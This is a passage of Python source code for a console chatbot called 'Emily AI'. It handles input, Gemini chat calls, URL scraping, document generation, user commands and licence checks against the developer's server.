                user_option = input(con_inf + bmagenta + "Gemini API key : " + nc)
            elif typ == 4:
                user_option = input(con_inf + bmagenta + "Input : " + nc)
            sys.stdout.write("\033[F") 
            sys.stdout.write("\033[K") 
            play_sound(r'assets\sounds\txt_input.wav')
            
            if not user_option.strip():
                print(con_mns+bred+"Error: Input cannot be empty. Please enter a valid value."+nc)
                sleep(1)

                sys.stdout.write("\033[F") 
                sys.stdout.write("\033[K") 
                continue
            

            return user_option
        

        except KeyboardInterrupt:
            choice = input(con_mns+bred+"Do you really want to exit? (y/n): "+nc)
            sys.stdout.write("\033[F") 
            sys.stdout.write("\033[K")
            if choice == 'y':
                print("Exiting...!!!")
                sleep(2)
                os._exit(0)
            else:
                print(con_inf+bcyan+"Resuming input..."+nc)
                sleep(1)
                sys.stdout.write("\033[F") 
                sys.stdout.write("\033[K")

        except Exception as e:
            print(f"An error occurred: {e}. Please try again.")
            continue

def scrape_urls(urls, max_pages=3):
    scraped_data = {
        'scraped_pages': [],
        'unscraped_pages': []
    }

    for i, url in enumerate(urls):
        if i < max_pages:
            page_data = {
                'url': url,
                'status': 'failed',
                'error': None,
                'title': None,
                'content': None
            }
            
            try:
                response = requests.get(url, timeout=30)
                response.raise_for_status()
                
                soup = BeautifulSoup(response.text, 'html.parser')
                page_data.update({
                    'status': 'success',
                    'title': soup.title.string if soup.title else 'No title',
                    'content': soup.get_text(strip=True),
                    'error': None
                })              
            except Exception as e:
                page_data['error'] = str(e)
            
            finally:
                scraped_data['scraped_pages'].append(page_data)
        else:
            scraped_data['unscraped_pages'].append({
                'url': url,
                'reason': 'Exceeded max_pages limit'
            })

    return scraped_data

def format_scraped_data_as_text(data):
    text_output = []

    for page in data['scraped_pages']:
        text_output.append(f"URL: {page['url']}")
        text_output.append(f"Status: {page['status']}")
        text_output.append(f"Title: {page['title']}")
        text_output.append(f"Content: {page['content']}")
        text_output.append(f"Error: {page['error']}\n")

    for page in data['unscraped_pages']:
        text_output.append(f"URL: {page['url']}")
        text_output.append(f"Reason: {page['reason']}\n")

    return "\n".join(text_output)

def userinput(quary):
    try:
        check_status(headers)
        global chat
        spinner = LoadingSpinner("Loading...", 0.05)
        spinner.start()
        try:
            response = chat.send_message(quary)
            spinner.stop()
        except KeyboardInterrupt:
            spinner.stop()
            play_sound(r'assets\sounds\intrupt_tsk.wav')
            main()
        except Exception as e:
            spinner.stop()
            print(con_mns+bred+f"An error occurred... {e}"+nc)
            main()
        result1 = response.text
        ####################################print(result1)
        result1 = re.sub(r'\n+', '\n', result1)
        result1 = re.sub(r'\n+$', '', result1)
        result1 = result1.replace('**', '')
        result = replace_placeholders(result1)
        method, result = check_and_exit(result)
        if method == None:
            insert_into_db('user', quary)
            insert_into_db('model', result)
            print(con_pls+bgreen+'User  : '+white+quary+nc)
            print(con_ai+bgreen+'Emily : '+bcyan+result+nc)
            play_sound(r'assets\sounds\msg_out.wav')
            plane = clean_text_for_tts(result)
            voice(plane)
            main()
        elif method == 'SCRAP28840N':
            insert_into_db('user', quary)
            play_sound(r'assets\sounds\msg_out.wav')
            print(con_pls+bgreen+'User  : '+white+quary+nc)
            spinner = LoadingSpinner(f"{con_ai}{bgreen}Scraping : {bcyan}URL : {', '.join(result)}{nc}", 0.05)
            spinner.start()
            result = scrape_urls(result,max_pages=3)
            data = format_scraped_data_as_text(result)
            response = chat.send_message(data)
            result1 = response.text
            result1 = re.sub(r'\n+', '\n', result1)
            result1 = re.sub(r'\n+$', '', result1)
            result1 = result1.replace('**', '')
            result = replace_placeholders(result1)
            insert_into_db('model', result)
            spinner.stop()
            print(con_ai+bgreen+'Emily : '+bcyan+result+nc)
            play_sound(r'assets\sounds\msg_out.wav')
            plane = clean_text_for_tts(result)
            voice(plane)
            main()
        else :
            insert_into_db('user', quary)
            play_sound(r'assets\sounds\msg_out.wav')
            insert_into_db('model', result)
            print(con_pls+bgreen+'User  : '+white+quary+nc)
            play_sound(r'assets\sounds\task_wait.wav')
            print(con_ai+bgreen+'Emily : '+bcyan+"Please wait while your task is being completed..."+nc)
            spinner = LoadingSpinner("Generating Content... ", 0.1)
            spinner.start()
            sleep(2)
            generated_content = generate_docx_content(result)
            spinner.update_message("Creating File... ")
            create_and_open_docx(generated_content)
            play_sound(r'assets\sounds\task_comp.wav')
            spinner.stop()
            print(con_ai+bgreen+'Emily : '+bcyan+"Task completed. Opening your file..."+nc)
            sleep(2)
            main()
    except KeyboardInterrupt:
            spinner.stop()
            play_sound(r'assets\sounds\intrupt_tsk.wav')
            main()
    except:
            spinner.stop()
            print(con_mns+bred+"An error occurred..."+nc)
            main()



def fetch_real_time_info():
    now = datetime.now()



    # Format time and date
    current_time = now.strftime("%H : %M")
    current_date = now.strftime("%A, %m %d %Y")  # Example: "Wednesday, 08/14/2024"

    return {
        "TIME8840": current_time,
        "DATE8840": current_date
    }



def replace_placeholders(response):
    real_time_data = fetch_real_time_info()
    for placeholder, value in real_time_data.items():
        response = response.replace(f"[{placeholder}]", value)
    return response



class LoadingSpinner:
    def __init__(self, message="AI processing", delay=0.1):
        self.message = '\033[1;37m'+message
        self.delay = delay
        #self.spinner = itertools.cycle(["🤖", "👁️", "🔍", "💡", "📡", "🧠", "✍️ ", "📚", "📊", "💬"])
        self.spinner = itertools.cycle(["\033[1;35m[\033[1;32m••        \033[1;35m]","\033[1;35m[\033[1;32m•••       \033[1;35m]","\033[1;35m[\033[1;32m••••      \033[1;35m]","\033[1;35m[\033[1;32m ••••     \033[1;35m]","\033[1;35m[\033[1;32m  ••••    \033[1;35m]","\033[1;35m[\033[1;32m   ••••   \033[1;35m]","\033[1;35m[\033[1;32m    ••••  \033[1;35m]","\033[1;35m[\033[1;32m     •••• \033[1;35m]","\033[1;35m[\033[1;32m      ••••\033[1;35m]","\033[1;35m[\033[1;32m      ••••\033[1;35m]","\033[1;35m[\033[1;32m       •••\033[1;35m]","\033[1;35m[\033[1;32m•       ••\033[1;35m]","\033[1;35m[\033[1;32m••       •\033[1;35m]"])
        self.stop_running = threading.Event()


    def spinner_task(self):
        while not self.stop_running.is_set():
            sys.stdout.write(f"\r{self.message} {next(self.spinner)} ")
            sys.stdout.flush()
            time.sleep(self.delay)
        sys.stdout.write("\r\033[00m" + " " * (len(self.message) + 15) + "\r")


    def start(self): 
        self.thread = threading.Thread(target=self.spinner_task)
        self.thread.start()


    def stop(self):
        self.stop_running.set()
        self.thread.join()


    def update_message(self, new_message):
        self.message = new_message

def hendilcominput(input_string):
    if 'exit_bot' in input_string:
        print(con_mns+bred+"System : Closing program..."+nc)
        play_sound(r'assets\sounds\stop-scr.wav')
        os._exit(0)
    elif 'deactivate_account' in input_string:
        print(con_mns+bred+"System : Deactivating... "+nc)
        sysdeactivate(headers)

    elif 'voice_method' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_ai+bgreen+'System : '+bcyan+'Changing to Voice input'+nc)
        chat_type = 1
        main()
    elif 'show_history' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_ai+bgreen+'System : '+bcyan+'Printing History...'+nc)
        spinner = LoadingSpinner("System : Getting Chats...", 0.1)
        spinner.start()
        history =get_interactions()
        spinner.update_message("System : Creating File... ")
        print_dialogue_to_docx(history)
        spinner.stop()
        main()
    elif 'show_commands' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_ai+bgreen+'System : '+bcyan+'Commands - Emily AI'+nc)
        print(help_dta)
        main()
    elif 'erase_memory' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_mns+'System : '+bred+'Ersing History...'+nc)
        spinner = LoadingSpinner(con_mns+bred+"System : Ersing memory... "+nc, 0.1)
        spinner.start()
        empty_database()
        spinner.stop()
        input(con_mns+bred+'System : Press Enter Key To Continue...'+nc)
        setup()

    elif 'attach_file' in input_string:
        print(con_mns+bgreen+'System : '+white+'Attach a file..'+nc)
        files_dict = select_files()
        sys.stdout.write("\033[F") 
        sys.stdout.write("\033[K")
        if files_dict:
            print(con_ai+bgreen+'System : File Attached...'+nc)

            quary = handle_user_input(1)

            spinner = LoadingSpinner(white+"Loading... "+nc, 0.1)

            spinner.start()

            response_list = [quary] + list(files_dict)[:5] 

            response = chat.send_message(response_list)

            method, result1 = check_and_exit(response.text)

            result1 = re.sub(r'\n+', '\n', result1)

            result1 = re.sub(r'\n+$', '', result1)

            result1 = result1.replace('**', '')

            result = replace_placeholders(result1)

            insert_into_db('user', quary)

            insert_into_db('model', result)

            spinner.stop()

            print(con_pls+bgreen+'User  : '+white+quary+nc)

            print(con_ai+bgreen+'Emily : '+bcyan+result+nc)

            play_sound(r'assets\sounds\msg_out.wav')

            plane = clean_text_for_tts(result)

            voice(plane)

            main()  

            
        else:
            print(con_mns+bred+"system : No files selected..."+nc)
            sleep(1)
            sys.stdout.write("\033[F") 
            sys.stdout.write("\033[K")
            main()
        #spinner.stop()
        main()
    elif 'sys_restart' in input_string:
        play_sound(r'assets\sounds\msg_out.wav')
        print(con_mns+'system : '+bred+'Restarting...'+nc)
        spinner = LoadingSpinner(con_mns+bred+"system : Restarting..."+nc, 0.1)
        spinner.start()
        sleep(1)
        spinner.stop()
        setup()


def main():
        if chat_type == 0 :
          query = handle_user_input(1)
          hendilcominput(query)
          userinput(query)
          main()
        elif chat_type == 1 :
          query,sts = takeCommand()
          if sts == 0:
              #hendilcominput(query)
              userinput(query)
          elif sts == 2:
              print(con_inf+byellow+query+nc)
              main()
          elif sts == 1:
              print(con_mns+bred+query+nc)
              main()

def modelconfigsys():
    global chat
    global model
    geminiapikey = get_value_by_id('5')
    if geminiapikey == None and user_type == 'premium':
        geminiapikey = systemdta['API']
    genai.configure(api_key=geminiapikey)
    model = genai.GenerativeModel(
        model_name= systemdta['model_name'],
        system_instruction = systemdta['system_instruction'],
        generation_config=genai.types.GenerationConfig(
        max_output_tokens=int(systemdta['max_output_tokens']),
        response_mime_type = "text/plain",
        temperature=float(systemdta['temperature']),  # Adjusting temperature for a more varied response
        top_p=float(systemdta['top_p']),  # For better randomness in responses
        ),safety_settings=systemdta['safety_settings'],)
    history =get_interactions()
    chat = model.start_chat(history=history)

unique_id = get_reliable_windows_id()

def register():
    global app
    app = LicenseRegistrationApp()
    app.run()

def restart_program():
    """
    Completely exits the current program and starts a fresh instance.
    Handles different running environments (script vs executable) and
    ensures clean process termination.
    """
    try:
        # Get the current process
        current_pid = os.getpid()
        current_process = psutil.Process(current_pid)
        
        # Clear console screen
        if os.name == 'nt':  # Windows
            os.system('cls')
        else:  # Unix/Linux/Mac
            os.system('clear')
            
        # Determine how to restart based on how the program is running
        if getattr(sys, 'frozen', False):
            # If running as a compiled executable
            executable = sys.executable
            args = []
        else:
            # If running as a Python script
            executable = sys.executable
            args = sys.argv
            
        # Start new process
        subprocess.Popen([executable] + args, 
                        creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == 'nt' else 0)
        
        # Close all file handles and cleanup
        try:
            for handler in current_process.open_files() + current_process.connections():
                os.close(handler.fd)
        except Exception:
            pass
            
        # Terminate the current process
        current_process.terminate()
        os._exit(0)
        
    except Exception as e:
        print(f"Error restarting program: {e}")
        # Wait for user input before exiting if there's an error
        input("Press Enter to exit...")
        sys.exit(1)


def setup():
    global systemdta
    global ttocken
    global spinner
    global user_type
    os.system('cls')
    checkdatabase()
    check_status(headers)
    check_data()
    check_iins() 
    spinner = LoadingSpinner("Loading ", 0.1)
    spinner.start()
    sysdta = check_token_and_get_data(headers,'https://dkydivyansh.com/Project/api/emily/index.php?id=3')
    systemdta = extract_sys_data(sysdta)
    checkversion()
    userdta = check_name(headers,'https://dkydivyansh.com/Project/api/emily/index.php?id=4')
    sysuserdta,sysusertype = extract_values_usersys(userdta)
    user_type = sysusertype
    spinner.stop()
    check_keys()
    modelconfigsys()
    username = sysuserdta
    systips = systemdta['tips']
    syslogosts = int(systemdta['use_custom-logo'])

    os.system('cls')
    if syslogosts == 1:
        logonew = systemdta['custom-logo']
        logonew = logonew.format(bcyan=bcyan,version=version, nc=nc, orange=orange,black=black,red=red,bred=bred,bgreen=bgreen,green=green,yellow=yellow,byellow=byellow,blue=blue,bblue=bblue,purple=purple,bpurple=bpurple,cyan=cyan,white=white,bwhite=bwhite,magenta=magenta,bmagenta=bmagenta,bright_red=bright_red,bright_green=bright_green,bright_yellow=bright_yellow,bright_blue=bright_blue,bright_magenta=bright_magenta,bright_cyan=bright_cyan,bright_white=bright_white,bright_light_blue=bright_light_blue,navy_blue=navy_blue,saffron=saffron,versioncode=versioncode)
        sys.stdout.reconfigure(encoding='utf-8')
        print(logonew)
    else:
        print(logo)
    print(con_inf+bright_light_blue+'User Type :'+bgreen+f' {user_type}\n'+con_inf+bright_light_blue+'Hello! '+bpurple+f'{username}\n')
    play_sound(r'assets\sounds\start.wav')
    #print_dialogue(history)
    print(f'{con_pls}{white}{systips}\n{con_pls}{white}Tips : Ask ai to change input method to voice( or type {bpurple}voice_method{white} ) or text. \n{con_pls}{white}Attach a file : Ask For File Attach Or Type {bpurple}attach_file{white} .\n{con_pls}{white}Help/Commands : Ask for Commands or Type {bpurple}show_commands{nc}')
    if user_type != "premium":
        print(con_mns+f"{byellow}Some feature's only available for premium member, Including AI voice feature."+nc)
    if user_type == "suspended":  
        print(con_mns+bred+'Your account has been suspended. If you believe this was a mistake, please contact our team at team@dkydivyansh.com'+nc)
        input('Press Enter Key to continue ')
        sys.exit(0)
    spinner = LoadingSpinner("Connecting to the server", 0.1)
    spinner.start()
    sleep(3)
    spinner.stop()
    main()
if __name__ == '__main__':
    set_console_title('Emily AI')
    try:
        results, exit_code = verify_system_environment()
        
        if exit_code == 0:
            print("\n✅ All checks passed. Continuing execution...")
            pass
        elif exit_code == 1:
            print("\n⚠️  Checks passed with warnings. Continuing execution...")
            pass
        else: 
            print("\n❌ Critical checks failed. Exiting program...")
            input('Press Enter Key to continue ')
            sys.exit(exit_code)
            
    except Exception as e:
        print(f"\n❌ Fatal error during verification: {str(e)}")
        input('Press Enter to continue ')
        sys.exit(2)
    check_single_instance()
    setup()